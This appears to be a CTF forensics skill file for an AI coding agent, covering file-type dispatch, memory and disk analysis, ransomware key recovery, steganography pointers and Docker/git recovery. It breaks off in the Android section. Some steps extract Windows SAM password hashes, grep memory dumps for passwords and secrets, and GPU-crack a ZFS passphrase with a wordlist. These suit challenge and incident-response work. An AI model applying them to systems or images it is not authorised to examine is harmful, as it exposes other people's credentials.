---
name: ctf-forensics
description: Digital forensics: disk/memory images (Volatility), PCAP + network steganography, Windows event logs & registry, side-channel power/EM traces, RF/SDR/DTMF/POCSAG decode, logic-analyzer (sigrok), image/audio stego, cryptocurrency tracing. Dispatch on file magic.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# CTF Forensics & Blockchain

Quick reference for forensics CTF challenges. Each technique has a one-liner here; see supporting files for full details.

## Additional Resources

- [3d-printing.md](3d-printing.md) — PrusaSlicer G-code, QOIF, heatshrink
- [windows.md](windows.md) — registry, SAM, event logs, Amcache, WMI persistence, MPLog
- [network.md](network.md) — tcpdump, TLS keylog, SMB3 decrypt, USB HID steno, split-archive reassembly
- [network-advanced.md](network-advanced.md) — packet-timing, NTLMv2, DNS stego, SMB RID recycle, UA-gated C2 hex-XOR
- [disk-and-memory.md](disk-and-memory.md) — Volatility, VMDK/VHD, RAID5 XOR, PowerShell ransomware, Docker/cloud
- [disk-and-memory-2.md](disk-and-memory-2.md) — 2024-26: ZFS, GPT GUID, KAPE, APFS snapshots, ransomware key recovery
- [steganography.md](steganography.md) — image stego: LSB, binary border, JPEG thumbnail, GIF differential
- [steganography-2.md](steganography-2.md) — 2024-26: PDF, PNG chunks, JPEG DQT, F5, jigsaw, QR tiles, seed-permuted
- [stego-advanced.md](stego-advanced.md) — FFT audio, DTMF/SSTV, multi-track diff, video frame accum
- [linux-forensics.md](linux-forensics.md) — log analysis, Docker image, browser artifacts, git recovery, KeePass v4
- [signals-and-hardware.md](signals-and-hardware.md) — VGA/HDMI/DP decode, POCSAG, PulseView I²C, flash ADC, DPA
---

## Pattern Recognition Index

Dispatch on **observed file types / byte signals**, not challenge titles.

| Signal in provided material | Technique → file |
|---|---|
| `.pcap` / `.pcapng` | network.md (then network-advanced.md for timing/covert channels) |
| `.sr` / `.srzip` / `.logicdata` (logic analyser) with SCL/SDA channels | PulseView I²C decoder + datasheet → signals-and-hardware.md |
| `.sr` / `.logicdata` with single data line, start/stop bits | Saleae UART decode → signals-and-hardware.md |
| `complex64`/`complex128` binary + sample-rate in prompt | IQ FFT masking / GQRX pipeline → signals-and-hardware.md |
| Audio with pager-like chirps, narrow FM channel | POCSAG → GQRX→sox→multimon-ng → signals-and-hardware.md |
| Schematic with stack of op-amps + resistor ladder on shared input | Flash ADC recovery → signals-and-hardware.md |
| Power traces shape `(positions, guesses, traces, samples)` | DPA / CPA → signals-and-hardware.md |
| `.raw` / `.vmem` / `.dmp` / `.lime` (memory dump) | Volatility → disk-and-memory.md |
| `.E01` / `.dd` / `.img` / VMDK | Disk carving / partitioning → disk-and-memory.md |
| `.evtx`, `SAM`, `NTUSER.DAT`, `SRUDB.dat` | Windows forensics → windows.md |
| Audio WAV with sync spikes or steady tones | Spectrogram / DTMF / SSTV → stego-advanced.md |
| PNG/JPEG/BMP with suspicious size or LSB patterns | Image stego → steganography.md |
| `.git/` directory fragment / dangling blob | Git reflog / fsck / blob repair → linux-forensics.md |
| Tarball from `docker save` + `.git/objects/??/…` files present but refs/HEAD damaged | Raw `zlib_decode` of every object → disk-and-memory-2.md |
| RAID disks with one missing, equal-size members | RAID5 XOR recovery → disk-and-memory.md |
| PCAP where only a specific User-Agent gets non-default responses + hex-looking paths | UA-gated C2 URL-path hex-XOR exfil → network-advanced.md |
| Two trace-sets labelled `fixed_vs_random` / `key_t` vs `key_r` / NIST-TVLA README | Welch's *t*-test leakage check → signals-and-hardware.md#tvla |
| Constant-time code + traces of equal length but visibly different shape | Morphology-over-duration clustering → signals-and-hardware.md#morphology |
| AES first-round target, 5k-10k traces with known plaintexts (`.npy` + plaintexts) | CPA on `sbox(p ⊕ k)` Hamming weight → signals-and-hardware.md#cpa |

Recognize **artefacts and bytes**, not names. If the file type matches, the section applies regardless of challenge title.

---

For inline code/cheatsheet quick references (grep patterns, one-liners, common payloads), see [quickref.md](quickref.md). The `Pattern Recognition Index` above is the dispatch table — always consult it first; load `quickref.md` only if you need a concrete snippet after dispatch.



---

<!-- Source: 3d-printing.md -->

# CTF Forensics - 3D Printing / CAD File Forensics

## Table of Contents
- [PrusaSlicer Binary G-code (.g / .bgcode)](#prusaslicer-binary-g-code-g--bgcode)
- [QOIF (Quite OK Image Format)](#qoif-quite-ok-image-format)
- [G-code Analysis Tips](#g-code-analysis-tips)
- [G-code Side View Visualization (0xFun 2026)](#g-code-side-view-visualization-0xfun-2026)
- [Uncommon File Magic Bytes](#uncommon-file-magic-bytes)

---

## PrusaSlicer Binary G-code (.g / .bgcode)

**File magic:** `GCDE` (4 bytes)

The `.g` extension is PrusaSlicer's binary G-code format (bgcode). It stores G-code in a block-based structure with compression.

**File structure:**
```text
Header: "GCDE"(4) + version(4) + checksum_type(2)
Blocks: [type(2) + compression(2) + uncompressed_size(4)
         + compressed_size(4) if compressed
         + type-specific fields
         + data + CRC32(4)]
```

**Block types:**
- 0 = FileMetadata (has encoding field, 2 bytes)
- 1 = GCode (has encoding field, 2 bytes)
- 2 = SlicerMetadata (has encoding field, 2 bytes)
- 3 = PrinterMetadata (has encoding field, 2 bytes)
- 4 = PrintMetadata (has encoding field, 2 bytes)
- 5 = Thumbnail (has format(2) + width(2) + height(2))

**Compression types:** 0=None, 1=Deflate, 2=Heatshrink(11,4), 3=Heatshrink(12,4)

**Thumbnail formats:** 0=PNG, 1=JPEG, 2=QOI (Quite OK Image)

**Parsing and extracting G-code:**
```python
import struct, zlib
import heatshrink2  # pip install heatshrink2

with open('file.g', 'rb') as f:
    data = f.read()

pos = 10  # After header
while pos < len(data) - 8:
    block_type = struct.unpack('<H', data[pos:pos+2])[0]
    compression = struct.unpack('<H', data[pos+2:pos+4])[0]
    uncompressed_size = struct.unpack('<I', data[pos+4:pos+8])[0]
    pos += 8
    if compression != 0:
        compressed_size = struct.unpack('<I', data[pos:pos+4])[0]
        pos += 4
    else:
        compressed_size = uncompressed_size
    # Type-specific extra header fields
    if block_type in [0,1,2,3,4]:
        pos += 2  # encoding field
    elif block_type == 5:
        pos += 6  # format + width + height
    block_data = data[pos:pos+compressed_size]
    pos += compressed_size + 4  # data + CRC32

    if block_type == 1:  # GCode block
        if compression == 3:  # Heatshrink 12/4
            gcode = heatshrink2.decompress(block_data, window_sz2=12, lookahead_sz2=4)
        elif compression == 1:  # Deflate (zlib)
            gcode = zlib.decompress(block_data)
        # Search gcode for hidden comments/flags
```

**Common hiding spots:**
- G-code comments (`;=== FLAG_CHAR ... ===`) at specific layer heights
- Custom G-code sections (`;TYPE:Custom`)
- Metadata fields (object names, filament info)
- Thumbnail images (extract and view QOIF/PNG)

## QOIF (Quite OK Image Format)

**Magic:** `qoif` (4 bytes) + width(4 BE) + height(4 BE) + channels(1) + colorspace(1)

Lightweight image format used in PrusaSlicer thumbnails. Decode with Python struct or use the `qoi` library.

## G-code Analysis Tips

```bash
# Search for flag patterns in decompressed gcode
grep -i "flag\|meta\|ctf\|secret" output.gcode

# Look for custom comments at layer changes
grep ";.*FLAG\|;.*LAYER_CHANGE" output.gcode

# Extract XY coordinates for visual patterns
grep "^G1" output.gcode | awk '{print $2, $3}' > coords.txt
```

## G-code Side View Visualization (0xFun 2026)

**Pattern (PrintedParts):** Plot X vs Z (side view) with Y filtering. Extrusion segments at specific Y ranges form readable text.

```bash
# Extract XY coordinates from G-code
grep "^G1" output.gcode | awk '{print $2, $3}' > coords.txt
# Plot with matplotlib for visual patterns
```

**Lesson:** G-code is just coordinate lists. Side projections (XZ or YZ) reveal embossed/engraved text.

---

## Uncommon File Magic Bytes

| Magic | Format | Extension | Notes |
|-------|--------|-----------|-------|
| `GCDE` | PrusaSlicer binary G-code | `.g`, `.bgcode` | 3D printing, heatshrink compressed |
| `qoif` | Quite OK Image Format | `.qoi` | Lightweight image format, often embedded |
| `OggS` | Ogg container | `.ogg` | Audio/video |
| `RIFF` | RIFF container | `.wav`,`.avi` | Check subformat |
| `%PDF` | PDF | `.pdf` | Check metadata & embedded objects |



---

<!-- Source: disk-and-memory-2.md -->

# CTF Forensics - Disk & Memory (2024-2026)

Modern disk / memory / snapshot forensics from 2024-2026. For the canonical toolbox (Volatility 3, VMware snapshots, ZFS basics, RAID 5 XOR, PowerShell ransomware), see [disk-and-memory.md](disk-and-memory.md).

## Table of Contents
- [ZFS Forensics (Nullcon 2026)](#zfs-forensics-nullcon-2026)
- [GPT Partition GUID Data Encoding (VuwCTF 2025)](#gpt-partition-guid-data-encoding-vuwctf-2025)
- [Windows Minidump String Carving (0xFun 2026)](#windows-minidump-string-carving-0xfun-2026)
- [VMDK Sparse Parsing (0xFun 2026)](#vmdk-sparse-parsing-0xfun-2026)
- [Memory Dump String Carving (Pragyan 2026)](#memory-dump-string-carving-pragyan-2026)
- [Memory Dump Malware Extraction + XOR (VuwCTF 2025)](#memory-dump-malware-extraction--xor-vuwctf-2025)
- [Linux Ransomware Memory-Key Recovery (MetaCTF 2026)](#linux-ransomware-memory-key-recovery-metactf-2026)
- [WordPerfect Macro XOR Extraction (srdnlenCTF 2026)](#wordperfect-macro-xor-extraction-srdnlenctf-2026)
- [Minidump ISO 9660 Recovery + XOR Key (srdnlenCTF 2026)](#minidump-iso-9660-recovery--xor-key-srdnlenctf-2026)
- [APFS Snapshot Historical File Recovery (srdnlenCTF 2026)](#apfs-snapshot-historical-file-recovery-srdnlenctf-2026)
- [Windows KAPE Triage Analysis (UTCTF 2026)](#windows-kape-triage-analysis-utctf-2026)

---

## ZFS Forensics (Nullcon 2026)

**Pattern:** Corrupted ZFS pool image with encrypted dataset.

**Recovery workflow:**
1. **Label reconstruction:** All 4 ZFS labels may be zeroed. Find packed nvlist data elsewhere in the image using `strings` + offset searching.
2. **MOS object repair:** Copy known-good nvlist bytes to block locations, recompute Fletcher4 checksums:
```python
def fletcher4(data):
    a = b = c = d = 0
    for i in range(0, len(data), 4):
        a = (a + int.from_bytes(data[i:i+4], 'little')) & 0xffffffff
        b = (b + a) & 0xffffffff
        c = (c + b) & 0xffffffff
        d = (d + c) & 0xffffffff
    return (d << 96) | (c << 64) | (b << 32) | a
```
3. **Encryption cracking:** Extract PBKDF2 parameters (iterations, salt) from ZAP objects. GPU-accelerate with PyOpenCL for PBKDF2-HMAC-SHA1, verify AES-256-GCM unwrap on CPU.
4. **Passphrase list:** rockyou.txt or similar. GPU rate: ~24k passwords/sec.

---

## GPT Partition GUID Data Encoding (VuwCTF 2025)

**Pattern (Undercut):** "LLMs only" + "undercut" → not AI GPT, but GUID Partition Table.

**Key insight:** GPT partition GUIDs are 16 arbitrary bytes — can encode anything. Look for file magic headers in GUIDs.

```bash
# Parse GPT partition table
gdisk -l image.img
# Or with Python:
python3 -c "
import struct
data = open('image.img','rb').read()
# GPT header at LBA 1 (offset 512)
# Partition entries start at LBA 2 (offset 1024)
# Each entry is 128 bytes, GUID at offset 16 (16 bytes)
for i in range(128):
    entry = data[1024 + i*128 : 1024 + (i+1)*128]
    guid = entry[16:32]
    if guid != b'\x00'*16:
        print(f'Partition {i}: {guid.hex()}')
"
```

**First GUID starts with `BZh11AY&SY`** (bzip2 magic) → concatenate GUIDs, decompress as bzip2, then decode ASCII85.

---

## Windows Minidump String Carving (0xFun 2026)

**Pattern (kd):** Go binary crash dump. Flag as plaintext string constant in .data section survives in minidump memory.

```bash
strings -a minidump.dmp | grep -i "flag\|ctf\|0xFUN"
```

**Lesson:** Minidumps contain full memory regions. String constants, keys, and secrets persist. `strings -a` + `grep` is the fast path.

---

## VMDK Sparse Parsing (0xFun 2026)

**Pattern (VMware):** Split sparse VMDK requires grain directory + grain table traversal.

**Key steps:**
1. Parse VMDK sparse header (grain size, GD offset, GT coverage)
2. Follow grain directory → grain table → data grains
3. Calculate absolute disk offsets across split files
4. Mount extracted filesystem (ext4, NTFS)

**Lesson:** Don't assume VM images can be mounted directly. Parse the VMDK sparse format manually.

---

## Memory Dump String Carving (Pragyan 2026)

**Pattern (c47chm31fy0uc4n):** Linux memory dump with flag in environment variables or process data.

```bash
strings -a -n 6 memdump.bin | grep -E "SYNC|FLAG|SSH_CLIENT|SESSION_KEY"
# SSH artifacts reveal source IP and ephemeral port
# Environment variables may contain keys/tokens
```

---

## Memory Dump Malware Extraction + XOR (VuwCTF 2025)

**Pattern (Jellycat):** Extract fake executable from Windows memory dump. Cipher: subtract 0x32, then XOR with cycling key (large multi-line string, e.g., ASCII art).

**Key lesson:** Always extract and reverse the actual binary from memory rather than trusting `strings` output (string tables may be red herrings). XOR keys can be hundreds of bytes (ASCII art, lorem ipsum).

```python
# Extract binary, find XOR key in data section
key = b"..."  # Large ASCII art string
cipher = open('extracted.bin', 'rb').read()
plaintext = bytes((b - 0x32) ^ key[i % len(key)] for i, b in enumerate(cipher))
```

---

## Linux Ransomware Memory-Key Recovery (MetaCTF 2026)

**Pattern:** Linux memory dump + encrypted `.veg` files + `enc_key.bin`; ransomware uses hybrid crypto (AES for files, RSA-wrapped key). Volatility may fail process enumeration due symbol/KASLR (Kernel Address Space Layout Randomization) mismatch.

**Fast workflow:**
1. **Confirm archive integrity before analysis.**
```bash
unzip -l encrypted_files.zip
# Compare listed files/sizes vs extracted tree; re-extract cleanly if mismatch
unzip -o encrypted_files.zip -d encrypted_full
```

2. **Reverse ransomware binary quickly to identify mode/layout.**
```bash
strings -a ransomware.elf | grep -E "enc_key|EVP_aes|PUBLIC KEY|.veg"
objdump -d ransomware.elf | less
```
- Typical finding: `AES-256-OFB`, IV prepended to each `.veg`, global 32-byte AES key, RSA public key hardcoded.

3. **Try Volatility normally, then pivot immediately if empty/unstable.**
```bash
vol -f memdump.raw linux.pslist
vol -f memdump.raw linux.proc.Maps
vol -f memdump.raw linux.vmayarascan
```
- If Linux plugins return empty/invalid output despite correct banner/symbols, do **raw-memory candidate scanning**.

4. **Recover AES key via anchored candidate scan + magic validation.**
- Use recurring anchor strings in memory (e.g., `/home/.../enc_key.bin`, HOME path).
- Derive candidate offsets near anchors (page-aligned windows).
- Test each 32-byte candidate by decrypting first blocks of multiple `.veg` files and checking magic bytes (`%PDF-`, `PK\x03\x04`, `\x89PNG\r\n\x1a\n`).
- Keep candidates that satisfy multiple independent signatures.

5. **Decrypt full dataset and verify output completeness.**
```bash
# OFB: iv = first 16 bytes, ciphertext starts at +16
# Decrypt all *.veg recursively from a clean extraction directory
```
- Validate recovered file count against zip listing.
- Watch for duplicated mirror trees (e.g., `snap/*/Downloads/...`) and deduplicate logically.

6. **Defend against false flags.**
- Treat metadata-only flags as suspicious until corroborated by challenge context.
- Prefer tokens from primary project artifacts and perform uniqueness checks:
```bash
rg -n -a '[A-Za-z]+CTF\\{[^}]+\\}' recovered_full
pdftotext recovered_full/**/*.pdf - 2>/dev/null | rg '[A-Za-z]+CTF\\{'
```

**Key lessons:**
- Don’t trust a partial/stale extraction tree; re-extract zip cleanly.
- In OFB ransomware, magic-byte validation is a fast key oracle.
- A plausible `CTF{...}` in metadata can be a decoy; confirm with corpus-wide consistency.

---

## WordPerfect Macro XOR Extraction (srdnlenCTF 2026)

**Pattern (Trilogy of Death Vol I: Corel):** Corel Linux disk image containing WordPerfect macro file (fc.wcm) with XOR-encrypted byte arrays.

**Key insight:** WordPerfect macro files (`.wcm`) can contain executable macros with embedded encrypted data. The XOR formula `(bb + kb) - 2*(bb & kb)` is mathematically equivalent to bitwise XOR.

**Brute-force 4-byte XOR key under charset constraints:**
```python
import string

docbody = [206, 56, 8, 128, 209, 47, 2, 149, ...]  # encrypted bytes from macro
allowed = set(map(ord, string.ascii_lowercase + string.digits + "_{}"))

# Find valid key bytes independently for each position mod 4
cands = []
for j in range(4):
    good = []
    for k in range(256):
        if all((docbody[i] ^ k) in allowed for i in range(j, len(docbody), 4)):
            good.append(k)
    cands.append(good)

# Try all combinations (usually very few candidates per position)
for k0 in cands[0]:
    for k1 in cands[1]:
        for k2 in cands[2]:
            for k3 in cands[3]:
                key = [k0, k1, k2, k3]
                pt = ''.join(chr(c ^ key[i % 4]) for i, c in enumerate(docbody))
                if pt.startswith("srd") and pt.endswith("}"):
                    print(pt)
```

**Lesson:** Legacy document formats (WordPerfect, Lotus 1-2-3) can embed executable macros with obfuscated data. When you know the flag charset, brute-forcing a short XOR key is trivial by filtering each key byte independently.

---

## Minidump ISO 9660 Recovery + XOR Key (srdnlenCTF 2026)

**Pattern (Trilogy of Death Vol II: The Legendary Armory):** Two relics in volatile memory (minidump) must be XORed; ISO 9660 directory entries in memory fragments point to hidden data.

**Technique:**
1. Search minidump for ISO 9660 directory entry signatures
2. Parse directory entries to locate target file offset and size
3. Decrypt file using recovered XOR key (e.g., 8-byte repeating key)
4. Parse resulting data as ZIP without central directory (local headers only)

**ZIP local header parsing without central directory:**
```python
import struct, zlib

pos = 0
files = {}
while True:
    off = dec.find(b"PK\x03\x04", pos)
    if off < 0:
        break
    (ver, flag, method, _, _, crc, csize, usize, nlen, xlen) = struct.unpack_from(
        "<HHHHHIIIHH", dec, off + 4)
    name = dec[off + 30:off + 30 + nlen].decode()
    data_off = off + 30 + nlen + xlen
    comp = dec[data_off:data_off + csize]
    if method == 8:  # Deflate
        raw = zlib.decompress(comp, -15)
    else:
        raw = comp
    files[name] = raw
    pos = data_off + csize
```

**Key insight:** When ZIP central directory is missing/corrupt, iterate local file headers (`PK\x03\x04`) directly. Each local header contains enough metadata (compression method, sizes, filename) to extract files independently.

---

## APFS Snapshot Historical File Recovery (srdnlenCTF 2026)

**Pattern (Trilogy of Death Vol III: The Poisoned Apple):** APFS volume maintains historical snapshots; recovering earlier state of a key file reveals authentic value before poisoning.

**Technique:**
1. Extract APFS partition from DMG (locate by sector offset)
2. Search for APFS volume superblocks (magic `APSB`) across all snapshots, noting transaction IDs (XIDs)
3. Use `icat` (Sleuth Kit with APFS support) to read specific inodes across different snapshot XIDs
4. Compare file content across XID boundaries to identify when poisoning occurred
5. Use pre-poisoning value for decryption

**Finding APFS volume superblocks across snapshots:**
```python
import struct

with open("apfs_partition.img", "rb") as f:
    mm = f.read()

snaps = []
pos = 0
while True:
    idx = mm.find(b"APSB", pos)
    if idx < 0:
        break
    # XID is at offset -16 from magic (in block header)
    hdr_start = idx - 32
    xid = struct.unpack_from("<Q", mm, hdr_start + 16)[0]
    blk = hdr_start // 4096
    snaps.append((xid, blk))
    pos = idx + 1

# Read target inode across snapshots
import subprocess
for xid, blk in sorted(set(snaps)):
    try:
        out = subprocess.check_output(
            ["icat", "-f", "apfs", "-P", "apfs", "-B", str(blk),
             "apfs_partition.img", "449414"])  # target inode number
        print(f"XID {xid}: {out[:64]}...")
    except:
        pass
```

**Decryption with recovered authentic key:**
```python
import hashlib
from Cryptodome.Cipher import AES

# Pre-poisoning key value (found in earlier snapshot)
authentic_key_hex = "39f520679fd68654500f9cd44e8caed2bc897a3227dc297c4520336de2a59dd7"
key = hashlib.pbkdf2_hmac('sha256', bytes.fromhex(authentic_key_hex), salt, iterations)
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(encrypted_flag)
```

**Key insight:** APFS (and other copy-on-write filesystems like ZFS/Btrfs) preserve historical file states in snapshots. When a challenge involves "poisoned" or "tampered" data, always check for older snapshots containing the original values. Use `icat` with different block offsets to read the same inode across different transaction IDs.

---

## Windows KAPE Triage Analysis (UTCTF 2026)

**Pattern (Landfall, Sherlockk, Cold Workspace):** KAPE (Kroll Artifact Parser and Extractor) triage collection ZIP containing Windows forensic artifacts. Multiple challenges reference the same triage dataset.

**KAPE triage structure:**
```text
Modified_KAPE_Triage_Files/
├── C/
│   ├── Users/<username>/
│   │   ├── AppData/Local/Microsoft/Windows/PowerShell/PSReadLine/
│   │   │   └── ConsoleHost_history.txt    # PowerShell command history
│   │   ├── NTUSER.DAT                     # User registry hive
│   │   └── AppData/Roaming/Microsoft/Windows/Recent/  # Recent files
│   ├── Windows/
│   │   ├── System32/config/
│   │   │   ├── SAM          # Password hashes
│   │   │   ├── SYSTEM       # System config + boot key
│   │   │   └── SOFTWARE     # Installed software
│   │   └── appcompat/Programs/
│   │       └── Amcache.hve  # Execution history with SHA-1 hashes
│   └── $MFT                 # Master File Table
└── ...
```

**High-value artifacts:**

1. **PowerShell history** — reveals attacker commands:
```bash
cat "C/Users/*/AppData/Local/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
# Look for: credential access, lateral movement, data staging
```

2. **Amcache** — executed programs with timestamps and hashes:
```bash
# Parse with Eric Zimmerman's AmcacheParser or regipy
python3 -c "
from regipy.registry import RegistryHive
reg = RegistryHive('C/Windows/appcompat/Programs/Amcache.hve')
for entry in reg.recurse_subkeys(as_json=True):
    print(entry)
" | grep -i "flag\|suspicious\|malware"
```

3. **MFT resident data** — small files stored directly in MFT records:
```python
# Parse MFT for resident file data (files < ~700 bytes stored inline)
# Use analyzeMFT or python-ntfs
import struct

with open('$MFT', 'rb') as f:
    mft_data = f.read()

# Search for flag patterns in raw MFT data
import re
flags = re.findall(rb'utflag\{[^}]+\}', mft_data)
for flag in flags:
    print(f"Found: {flag.decode()}")
```

4. **Environment variables from memory dumps** (Cold Workspace pattern):
```bash
# Small .dmp files may be minidumps with environment variable blocks
strings -a cold-workspace.dmp | grep -i "flag\|password\|key\|secret"
# Environment variables survive in process memory snapshots
```

**Challenge patterns from UTCTF 2026:**
- **Landfall:** Flag hidden in PowerShell history or Amcache execution records
- **Sherlockk:** Correlate Amcache entries with MFT timestamps to identify malicious activity
- **Cold Workspace:** Flag in environment variables extracted from memory dump
- **Checkpoint A/B:** Multi-part investigation using combined artifacts

**Key insight:** KAPE triage ZIPs contain pre-collected forensic artifacts — no need for full disk imaging. Start with PowerShell history (fastest wins) → Amcache (execution timeline) → MFT (resident data for small files) → registry hives (persistence, credentials).

---

## Damaged `.git` Inside Docker Image Layers — Raw `zlib_decode` of `.git/objects/*` (source: 404CTF 2025 Dockerflag)

**Trigger:**
- Challenge gives a tarball produced by `docker save image_name > image.tar`.
- After extracting layers you find a `.git/` directory but `git log`/`git show` fails with *bad object* / *corrupt loose object* / missing `HEAD` or `refs/`.
- The per-object files under `.git/objects/XX/YYYYYY…` still exist (file magic: first 2 bytes are zlib header `78 9C` or `78 01`).

**Signals to grep:**
```bash
# After docker save + tar -xf:
find . -name 'layer.tar' -exec tar -tvf {} \; | grep -E '\.git/'
find . -path '*.git/objects/*/*' | head
file $(find . -path '*.git/objects/*/*' | head -1)   # "zlib compressed data"
```

**Mechanic:** Git stores each loose object zlib-compressed. Even when refs/HEAD are missing or `.git/index` is corrupt, the object files themselves are self-contained — decompress each and grep for the target.

```python
# Recover every object, print contents
import os, zlib, pathlib
for p in pathlib.Path('.').rglob('.git/objects/??/*'):
    if p.is_file():
        try:
            data = zlib.decompress(p.read_bytes())
            header, _, body = data.partition(b'\x00')  # e.g. "blob 123\x00<content>"
            if b'FLAG' in body or b'flag' in body or b'404CTF' in body:
                print(p, header, body[:500])
        except Exception:
            pass
```
Equivalent one-liner in bash with `openssl zlib -d` or `pigz -dc`:
```bash
for f in $(find . -path '*.git/objects/*/*' -type f); do
  pigz -dc < "$f" 2>/dev/null | grep -aE 'flag|CTF\{' && echo "  ← $f"
done
```

**Docker layer forensics tie-in:** `docker save` writes each layer as `<sha>/layer.tar`. A file **deleted** in a later layer (e.g. a secret `.env` `rm`-ed during build) is still present in the earlier layer. Combine:
1. `tar -xf image.tar` → `manifest.json` tells you the layer order (oldest first).
2. Extract each `layer.tar` into its own `layer-N/` dir; `grep -r` for the target across all.
3. `docker history --no-trunc <image>` exposes build ARG/ENV values that may include secrets.
4. `dive <image>` visualises layer diffs interactively.

**Generalizes to:** any CI artifact where git history is pruned but object files leak; partial restore of destroyed repos (e.g. `git filter-branch` didn't clean objects); forensics of rebuild-time secret leaks.

---




---

<!-- Source: disk-and-memory.md -->

# CTF Forensics - Disk and Memory Analysis

## Table of Contents
- [Memory Forensics (Volatility 3)](#memory-forensics-volatility-3)
- [Disk Image Analysis](#disk-image-analysis)
- [VM Forensics (OVA/VMDK)](#vm-forensics-ovavmdk)
- [VMware Snapshot Forensics](#vmware-snapshot-forensics)
- [Coredump Analysis](#coredump-analysis)
- [Deleted Partition Recovery](#deleted-partition-recovery)
- [RAID 5 Disk Recovery via XOR (Crypto-Cat)](#raid-5-disk-recovery-via-xor-crypto-cat)
- [PowerShell Ransomware Analysis](#powershell-ransomware-analysis)

For 2024-2026 era techniques (ZFS, GPT GUID, KAPE, APFS snapshots, ransomware key recovery), see [disk-and-memory-2.md](disk-and-memory-2.md).
- [Android Forensics](#android-forensics)
- [Container Forensics (Docker)](#container-forensics-docker)
- [Cloud Storage Forensics (AWS S3 / GCP / Azure)](#cloud-storage-forensics-aws-s3--gcp--azure)

---

## Memory Forensics (Volatility 3)

```bash
vol3 -f memory.dmp windows.info
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.cmdline
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.filescan
vol3 -f memory.dmp windows.dumpfiles --physaddr <addr>
vol3 -f memory.dmp windows.mftscan | grep flag
```

**Common plugins:**
- `windows.pslist` / `windows.pstree` - Process listing
- `windows.cmdline` - Command line arguments
- `windows.netscan` - Network connections
- `windows.filescan` - File objects in memory
- `windows.dumpfiles` - Extract files by physical address
- `windows.mftscan` - MFT FILE objects in memory (timestamps, filenames). Note: `mftparser` was Volatility 2 only; Vol3 uses `mftscan`

---

## Disk Image Analysis

```bash
# Mount read-only
sudo mount -o loop,ro image.dd /mnt/evidence

# Autopsy / Sleuth Kit
fls -r image.dd              # List files recursively
icat image.dd <inode>        # Extract file by inode

# Carving deleted files
photorec image.dd
foremost -i image.dd
```

---

## VM Forensics (OVA/VMDK)

```bash
# OVA = TAR archive containing VMDK + OVF
tar -xvf machine.ova

# 7z reads VMDK directly (no mount needed)
7z l disk.vmdk | head -100
7z x disk.vmdk -oextracted "Windows/System32/config/SAM" -r
```

**Key files to extract from VM images:**
- `Windows/System32/config/SAM` - Password hashes
- `Windows/System32/config/SYSTEM` - Boot key
- `Windows/System32/config/SOFTWARE` - Installed software
- `Users/*/NTUSER.DAT` - User registry
- `Users/*/AppData/` - Browser data, credentials

---

## VMware Snapshot Forensics

**Converting VMware snapshots to memory dumps:**
```bash
# .vmss (suspended state) + .vmem (memory) → memory.dmp
vmss2core -W path/to/snapshot.vmss path/to/snapshot.vmem
# Output: memory.dmp (analyzable with Volatility/MemprocFS)
```

**Malware hunting in snapshots (Armorless):**
1. Check Amcache for executed binaries near encryption timestamp
2. Look for deceptive names (Unicode lookalikes: `ṙ` instead of `r`)
3. Dump suspicious executables from memory
4. If PyInstaller-packed: `pyinstxtractor` → decompile `.pyc`
5. If PyArmor-protected: use PyArmor-Unpacker

**Ransomware key recovery via MFT:**
- Even if original files deleted, MFT preserves modification timestamps
- Seed-based encryption: recover mtime → derive key
```bash
vol3 -f memory.dmp windows.mftscan | grep flag
# mtime as Unix epoch → seed for PRNG → derive encryption key
```

---

## Coredump Analysis

```bash
gdb -c core.dump
(gdb) info registers
(gdb) x/100x $rsp
(gdb) find 0x0, 0xffffffff, "flag"
```

---

## Deleted Partition Recovery

**Pattern (Till Delete Do Us Part):** USB image with deleted partition table.

**Recovery workflow:**
```bash
# Check for partitions
fdisk -l image.img              # Shows no partitions

# Recover partition table
testdisk image.img              # Interactive recovery

# Or use kpartx to map partitions
kpartx -av image.img            # Maps as /dev/mapper/loop0p1

# Mount recovered partition
mount /dev/mapper/loop0p1 /mnt/evidence

# Check for hidden directories
ls -la /mnt/evidence            # Look for .dotfolders
find /mnt/evidence -name ".*"   # Find hidden files
```

**Flag hiding:** Path components as flag chars (e.g., `/.Meta/CTF/{f/l/a/g}`)

---

## RAID 5 Disk Recovery via XOR (Crypto-Cat)

**Pattern:** RAID 5 array with one damaged/missing disk. Two working disks are provided and the third must be reconstructed using XOR parity.

**How RAID 5 parity works:** Data is striped across N disks with distributed parity. For any stripe, `Disk1 XOR Disk2 XOR ... XOR DiskN = 0`. If one disk is missing, XOR the remaining disks to recover it.

**Recovery script:**
```python
# Recover missing disk2 from disk1 and disk3
with open('disk1.img', 'rb') as f:
    disk1 = f.read()
with open('disk3.img', 'rb') as f:
    disk3 = f.read()

# XOR byte-by-byte to recover the missing disk
disk2 = bytes(a ^ b for a, b in zip(disk1, disk3))

with open('disk2.img', 'wb') as f:
    f.write(disk2)
```

**After recovery:**
```bash
# Reassemble the RAID array
mdadm --create /dev/md0 --level=5 --raid-devices=3 \
  disk1.img disk2.img disk3.img

# Or mount individual recovered disk if it contains a filesystem
mount -o loop,ro disk2.img /mnt/recovered
```

**Key insight:** RAID 5 uses XOR parity across all disks in each stripe. XOR is self-inverse: if `A XOR B XOR C = 0`, then `B = A XOR C`. For N-disk RAID 5, XOR all N-1 working disks together to recover the missing one.

**Detection:** Challenge provides multiple disk images of identical size, mentions "array", "redundancy", or "parity". `file` command may identify them as filesystem images or raw data.

---

## PowerShell Ransomware Analysis

**Pattern (Email From Krampus):** PowerShell memory dump + network capture.

**Analysis workflow:**
1. Extract script blocks from minidump:
```bash
python power_dump.py powershell.DMP
# Or: strings powershell.DMP | grep -A5 "function\|Invoke-"
```

2. Identify encryption (typically AES-CBC with SHA-256 key derivation)

3. Extract encrypted attachment from PCAP:
```bash
# Filter SMTP traffic in Wireshark
# Export attachment, base64 decode
```

4. Find encryption key in memory dump:
```bash
# Key often generated with Get-Random, regex search:
strings powershell.DMP | grep -E '^[A-Za-z0-9]{24}$' | sort | head
```

5. Find archive password similarly, decrypt layers

---

### Android Forensics

```bash
# Extract APK from device
adb pull /data/app/com.target.app/base.apk

# Analyze APK contents
